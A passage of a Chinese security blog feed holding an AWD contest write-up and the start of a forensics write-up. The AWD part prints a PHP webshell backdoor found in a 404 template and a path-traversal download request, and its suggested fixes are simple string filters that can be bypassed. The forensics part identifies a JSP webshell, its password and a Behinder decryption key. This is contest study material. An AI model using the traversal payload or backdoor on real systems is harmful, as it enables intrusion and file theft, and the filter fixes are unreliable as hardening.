class="hljs-string">&#x27;类型不支持，在常规管理中可配置！&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_ invoke__">validate</span>([ <span class="hljs-string">&#x27;file&#x27;</span> =&gt; [<span class="hljs-string">&#x27;fileSize&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;upload.size&#x27;</span>)[<span class="hljs-variable">$originalType</span>], <span class="hljs-string">&#x27;fileExt&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;upload.ext&#x27;</span>)[<span class="hljs-variable">$originalType</span>]] ])-&gt;<span class="hljs-title function_ invoke__">check</span>([<span class="hljs-string">&#x27;file&#x27;</span> =&gt; <span class="hljs-variable">$uploadFile</span>]);<br>    &#125; <span class="hljs-keyword">catch</span> (ValidateException <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>()]);<br>    &#125;<br>    <span class="hljs-comment">// 断点续传</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$chunkIndex</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span>)) &#123;<br>           <span class="hljs-variable">$oldChunkIndex</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span>)) - <span class="hljs-number">3</span>; <br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$oldChunkIndex</span> &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;断点续传&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-variable">$oldChunkIndex</span>, <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$chunkId</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 分片写入</span><br>    <span class="hljs-title class_">Filesystem</span>::<span class="hljs-title function_ invoke__">disk</span>(<span class="hljs-string">&#x27;public&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">putFileAs</span>(<span class="hljs-variable">$chunkPath</span>, <span class="hljs-variable">$uploadFile</span>, <span class="hljs-variable">$chunkIndex</span> . <span class="hljs-string">&#x27;.tmp&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$chunkIndex</span> &lt; <span class="hljs-variable">$chunkCount</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;分片上传&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-variable">$chunkIndex</span>, <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$chunkId</span>]);<br>    &#125;<br>    <span class="hljs-comment">// 分片检查</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$chunkCount</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27;.tmp&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件损坏，请重新上传&#x27;</span>]); <br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 分片合并</span><br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$originalType</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Ymd&#x27;</span>)  . <span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$filePath</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$fileExt</span>   = <span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalExtension</span>() ? <span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalExtension</span>() : <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$originalName</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$fileName</span>  = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>) . <span class="hljs-variable">$originalName</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$fileExt</span>;<br>    <span class="hljs-variable">$fileWrite</span> = @<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filePath</span> . <span class="hljs-variable">$fileName</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">flock</span>(<span class="hljs-variable">$fileWrite</span>, LOCK_EX)) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$chunkCount</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27;.tmp&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$handle</span> = @<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$uploadFile</span>, <span class="hljs-string">&quot;rb&quot;</span>)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$buff</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$uploadFile</span>))) &#123;<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fileWrite</span>, <span class="hljs-variable">$buff</span>);<br>            &#125;<br>            @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$uploadFile</span>); <span class="hljs-comment">//删除分片</span><br>        &#125;<br>        <span class="hljs-title function_ invoke__">flock</span>(<span class="hljs-variable">$fileWrite</span>, LOCK_UN);<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fileWrite</span>);<br>    <span class="hljs-comment">// 存入数据库</span><br>    <span class="hljs-variable">$save</span> = <span class="hljs-title class_">FileModel</span>::<span class="hljs-title function_ invoke__">create</span>([<br>        <span class="hljs-string">&#x27;title&#x27;</span>       =&gt; <span class="hljs-variable">$originalName</span>,<br>        <span class="hljs-string">&#x27;type&#x27;</span>        =&gt; <span class="hljs-variable">$originalType</span>,<br>        <span class="hljs-string">&#x27;size&#x27;</span>        =&gt; <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;size&#x27;</span>],<br>        <span class="hljs-string">&#x27;url&#x27;</span>         =&gt; <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">public_path</span>(), <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$filePath</span> . <span class="hljs-variable">$fileName</span>),<br>        <span class="hljs-string">&#x27;status&#x27;</span>      =&gt; <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&#x27;theme&#x27;</span>       =&gt; <span class="hljs-title function_ invoke__">theme</span>(),<br>        <span class="hljs-string">&#x27;create_time&#x27;</span> =&gt; <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;create_time&#x27;</span>],<br>    ]);<br>    <span class="hljs-comment">// 图片处理</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$originalType</span> === <span class="hljs-string">&quot;image&quot;</span> &amp;&amp; <span class="hljs-variable">$fileExt</span> != <span class="hljs-string">&#x27;ico&#x27;</span> &amp;&amp; <span class="hljs-variable">$fileExt</span> != <span class="hljs-string">&#x27;gif&#x27;</span>) &#123;<br>        <span class="hljs-comment">// 封面图片</span><br>        <span class="hljs-title function_ invoke__">thumbnail</span>(<span class="hljs-variable">$save</span>[<span class="hljs-string">&#x27;url&#x27;</span>],<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">// 水印图片</span><br>        <span class="hljs-variable">$watermark</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;watermark;<br>        <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$watermark</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermark</span>[<span class="hljs-string">&#x27;open&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-comment">// 水印图片</span><br>                <span class="hljs-variable">$watermarkConfig</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;watermark;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$watermarkConfig</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;open&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-variable">$file</span>     = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$save</span>-&gt;url);<br>                        <span class="hljs-variable">$image</span>    = <span class="hljs-title class_">Image</span>::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file</span>);<br>                        <span class="hljs-variable">$scale</span>    = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;scale&#x27;</span>] / <span class="hljs-number">100</span>;<br>                        <span class="hljs-variable">$position</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;position&#x27;</span>];<br>                        <span class="hljs-variable">$opacity</span>  = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;opacity&#x27;</span>];<br>                        <span class="hljs-variable">$height</span>   = <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">height</span>();<br>                        <span class="hljs-variable">$width</span>    = <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">width</span>(); <br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;type&#x27;</span>] === <span class="hljs-string">&#x27;image&#x27;</span>) &#123;<br>                            <span class="hljs-variable">$water</span> = <span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-string">&#x27;upload/watermark.png&#x27;</span>;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$water</span>)) &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;sizeType&#x27;</span>] === <span class="hljs-string">&#x27;scale&#x27;</span>) &#123;<br>                                    <span class="hljs-comment">// 按照比例</span><br>                                    <span class="hljs-variable">$thumb</span> = <span class="hljs-title class_">Image</span>::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$water</span>);<br>                                    <span class="hljs-variable">$waterName</span>  = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$save</span>-&gt;url, PATHINFO_FILENAME);<br>                                    <span class="hljs-variable">$waterThumb</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;watermark&#x27;</span>, <span class="hljs-string">&#x27;watermark_thumb&#x27;</span>, <span class="hljs-variable">$water</span>);<br>                                    <span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">thumb</span>(<span class="hljs-variable">$width</span>*<span class="hljs-variable">$scale</span>, <span class="hljs-variable">$height</span>*<span class="hljs-variable">$scale</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$waterThumb</span>);<br>                                    <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">water</span>(<span class="hljs-variable">$waterThumb</span>, <span class="hljs-variable">$position</span>, <span class="hljs-variable">$opacity</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$file</span>);<br>                                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$waterThumb</span>)) &#123;<br>                                        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$waterThumb</span>);<br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    <span class="hljs-comment">// 按实际大小</span><br>                                    <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">water</span>(<span class="hljs-variable">$water</span>, <span class="hljs-variable">$position</span>, <span class="hljs-variable">$opacity</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$file</span>);<br>                                &#125;<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-variable">$opacity</span>    = <span class="hljs-number">127</span> - (<span class="hljs-number">127</span> * <span class="hljs-variable">$opacity</span> / <span class="hljs-number">100</span>);<br>                            <span class="hljs-variable">$dechex</span>     = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$opacity</span>);<br>                            <span class="hljs-variable">$fontColor</span>  = <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontColor&#x27;</span>].<span class="hljs-variable">$dechex</span>;<br>                            <span class="hljs-variable">$fontSize</span>   = <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;sizeType&#x27;</span>] === <span class="hljs-string">&#x27;scale&#x27;</span> ? <span class="hljs-variable">$scale</span> * (<span class="hljs-variable">$width</span>/<span class="hljs-number">2</span>) : <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontSize&#x27;</span>];<br>                            <span class="hljs-variable">$fontFamily</span> = <span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontFamily&#x27;</span>];<br>                            <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">text</span>(<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontText&#x27;</span>], <span class="hljs-variable">$fontFamily</span>, <span class="hljs-variable">$fontSize</span>, <span class="hljs-variable">$fontColor</span>, <span class="hljs-variable">$position</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontAngle&#x27;</span>])-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$file</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 上传结束钩子</span><br>    <span class="hljs-title function_ invoke__">event</span>(<span class="hljs-string">&#x27;UploadEnd&#x27;</span>, <span class="hljs-variable">$save</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;上传成功&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-variable">$save</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-9.png"></p><h2 id="漏洞4-任意文件读取"><a href="#漏洞4-任意文件读取" class="headerlink" title="漏洞4-任意文件读取"></a>漏洞4-任意文件读取</h2><p>在修漏洞3-任意文件上传的时候看到就在上传文件的代码的上面几行就是一个下载函数，没有任何过滤，可以直接利用</p><p><code>app/admin/controller/File.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 下载文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">input</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">download</span>(<span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/oka_admin/file/download?url=../../../../../../flag&amp;title=1.txt</code></p><p><img src="/img/awd/2024nb-10.png"></p><p><strong>修复</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 下载文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">input</span>();<br><br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$input</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">download</span>(<span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 下载文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">input</span>();<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>],<span class="hljs-string">&#x27;flag&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;No No&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">download</span>(<span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞5-rce"><a href="#漏洞5-rce" class="headerlink" title="漏洞5-rce"></a>漏洞5-rce</h2><p>审计发现<code>public/themes/template/404.html</code>包含恶意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-variable">$aa</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>  <span class="hljs-variable">$bb</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  ((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-5.png"></p><p>访问任意不存在的文件使得404.html被包含即可通过Error内置类进行rce</p><p><img src="/img/awd/2024nb-6.png"></p><p><strong>修复</strong></p><p>直接删掉这段代码</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>1：web靶机从第二轮开始基本所有队伍都上了通防，基本全靠pwn拿分了（偶尔会有几个web重置可以拿分）<br>2：网络环境很差，有的靶机访问特别慢<br>3：大概第四第五轮开始ssh中断，一直到结束前四十分钟才恢复<br>4：没与工作人员说明的情况下靶机被重置多次（好像很多队伍都被重置了。但是重置后ssh密码也被更改了，赛后才知道是123456）<br>5：大量靶机没有flag（可能有队伍提权了，不过猜测大概率是因为ssh连不上导致写不进flag）<br>6：flag提交的api接口有问题（例子：交了10个flag，全部显示flag错误，但是会加分）</p><p><img src="/img/awd/2024nb-11.png" alt="哈哈哈哈"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;攻击&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="宁波" scheme="https://www.dr0n.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>第一届长城杯信息安全铁人三项赛决赛 取证溯源 wp</title>
    <link href="https://www.dr0n.top/posts/8ba5208d/"/>
    <id>https://www.dr0n.top/posts/8ba5208d/</id>
    <published>2024-05-24T10:00:00.000Z</published>
    <updated>2025-07-27T10:03:56.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="取证溯源"><a href="#取证溯源" class="headerlink" title="取证溯源"></a>取证溯源</h1><blockquote><p>1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小李通过简单分析，发现可能是由于公司的移动应用和其服务端程序都存在安全问题导致的。小李将当天可能与攻击相关的流量导出，并与移动应用一起打包压缩，你可以下载分析，也可以登录此服务器进行攻击溯源、排查等，提供了SSH和VNC访问的方式供您和您的团队进行分析取证。</p></blockquote><h2 id="关卡01：-100-分"><a href="#关卡01：-100-分" class="headerlink" title="关卡01： 100 分"></a>关卡01： 100 分</h2><blockquote><p>关卡描述：黑客攻击此服务器所使用的2个IP分别是什么（ascii码从小到大排列，空格分隔）</p></blockquote><p>流量包得到第一个攻击ip</p><p><img src="/img/wp/2024/2024ccb-quzheng-2.png"></p><p>在定时反弹的邮件中得到另一个ip</p><p><img src="/img/wp/2024/2024ccb-quzheng-1.png"></p><p><code>202.1.1.1 202.1.1.129</code></p><h2 id="关卡02：-50-分"><a href="#关卡02：-50-分" class="headerlink" title="关卡02： 50 分"></a>关卡02： 50 分</h2><blockquote><p>关卡描述：存在安全问题的apk中使用的登录密码是什么?</p></blockquote><p>jadx打开搜索<code>password</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-3.png"></p><p><code>password663399</code></p><h2 id="关卡03：-50-分"><a href="#关卡03：-50-分" class="headerlink" title="关卡03： 50 分"></a>关卡03： 50 分</h2><blockquote><p>关卡描述：黑客尝试上传一个文件但显示无上传权限的文件名是什么？</p></blockquote><p>在流量包中搜索</p><p><img src="/img/wp/2024/2024ccb-quzheng-4.png"></p><p><code>pic.jpg</code></p><h2 id="关卡04：-150-分"><a href="#关卡04：-150-分" class="headerlink" title="关卡04： 150 分"></a>关卡04： 150 分</h2><blockquote><p>关卡描述：黑客利用的漏洞接口的api地址是什么?（<a href="http://xxxx/xx">http://xxxx/xx</a>)</p></blockquote><p>找到上传成功的那个包即可</p><p><img src="/img/wp/2024/2024ccb-quzheng-5.png"></p><p><code>http://202.1.1.66:8080/api/upload</code></p><h2 id="关卡05：-150-分"><a href="#关卡05：-150-分" class="headerlink" title="关卡05： 150 分"></a>关卡05： 150 分</h2><blockquote><p>关卡描述：黑客上传的webshell绝对路径是什么？</p></blockquote><p>连上靶机，找到tomcat根目录，然后根据上一题的访问路径找到shell</p><p><img src="/img/wp/2024/2024ccb-quzheng-6.png"></p><p><code>/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp</code></p><h2 id="关卡06：-150-分"><a href="#关卡06：-150-分" class="headerlink" title="关卡06： 150 分"></a>关卡06： 150 分</h2><blockquote><p>关卡描述：黑客上传的webshell的密码是什么？</p></blockquote><p>分析上上题的代码</p><p><img src="/img/wp/2024/2024ccb-quzheng-7.png"></p><p><code>bing_pass</code></p><h2 id="关卡07：-200-分"><a href="#关卡07：-200-分" class="headerlink" title="关卡07： 200 分"></a>关卡07： 200 分</h2><blockquote><p>关卡描述：黑客通过webshell执行的第一条命令是什么？</p></blockquote><p>筛选访问<code>/static/s74e7vwmzs21d5x6.jsp</code>的流量</p><p>第一个包是冰蝎的状态检测，所以应该看第二个包</p><p>密钥是<code>b99f657b04941030</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-10.png"></p><p>解aes后反编译</p><p><img src="/img/wp/2024/2024ccb-quzheng-8.png"></p><p><code>pwd</code></p><h2 id="关卡08：-150-分"><a href="#关卡08：-150-分" class="headerlink" title="关卡08： 150 分"></a>关卡08： 150 